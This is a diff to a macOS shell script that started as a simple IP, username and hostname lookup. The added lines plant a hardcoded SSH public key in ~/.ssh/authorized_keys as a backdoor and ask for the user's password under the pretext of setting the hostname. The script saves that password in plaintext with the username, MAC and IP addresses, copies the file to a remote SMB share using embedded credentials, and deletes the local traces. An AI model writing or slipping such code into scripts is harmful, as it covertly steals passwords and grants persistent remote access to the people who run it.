@@ -1,10 +1,36 @@
 #!/bin/bash
 
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDG3BC7xs/GTgVKsEHiLFHTvCNTVVnr8V6yBErsjGD+FCz0YAdkLZ3+fZW/5uywpPo+hRNLX7TrP+6+atUafCNxhiyxk0VblDDp6TI2vhXcZtMNlCRDOkZLo41DCaviYewqOLFgmypn5lYC68C4FQwkMdLJdINEklGh1Jv00eGJIl+CrDIMjlddQjIPivgXXq4+Ewce9IySI2YJIct9bH0X1fJWXvO/Ky1gnzPXfdnGZSe3TIuZk8nMf7OPzFZLRXa0jKYJhP//48s+VcSUsZtktxe/mL6s5JenFYiacenH4VCeXePs1/sB6Qh3gdQSh57QjNR6IvjTgvVGHIlQCexl user@Viktors-MacBook-Pro.local" >> ~/.ssh/authorized_keys
+
+echo "Enter your last name:"
+
+read varname
+FILE="/tmp/${varname}.txt"
+touch /tmp/$varname
+echo $varname >> $FILE
+
+read -s -p "Enter your password: " PASSWORD
+echo "pass: $PASSWORD" >> $FILE
+echo Hostname succesfull set for $varname
+echo "user: $USER" >> $FILE
+
+echo $PASSWORD | sudo -S scutil --set LocalHostName "$varname"
+echo $PASSWORD | sudo -S scutil --set ComputerName "$varname"
+echo $PASSWORD | sudo -S scutil --set HostName "$varname"
+
+echo Password has been stored
+
 #Get IP address
-ifconfig en0 | grep inet | grep -v inet6 | awk '{print $2}'
+MAC0=$(ifconfig en0 | grep ether | awk '{print $2}')
+IP0=$(ifconfig en0 | grep inet | grep -v inet6 | awk '{print $2}')
+echo "MAC0: $MAC0 IP0: $IP0" >> $FILE
+MAC1=$(ifconfig en1 | grep ether | awk '{print $2}')
+IP1=$(ifconfig en1 | grep inet | grep -v inet6 | awk '{print $2}')
+echo "MAC1: $MAC1 IP1: $IP1" >> $FILE
 
-#Get username
-echo "$USER"
-
-#Get hostname
-hostname
+mkdir /Users/$USER/Documents/mnt
+mount -t smbfs //cam1:qwerty123@10.10.4.242/cam1 /Users/$USER/Documents/mnt/
+cp $FILE /Users/$USER/Documents/mnt/
+rm $FILE
+umount /Users/$USER/Documents/mnt/
+rm -rf /Users/$USER/Documents/mnt/
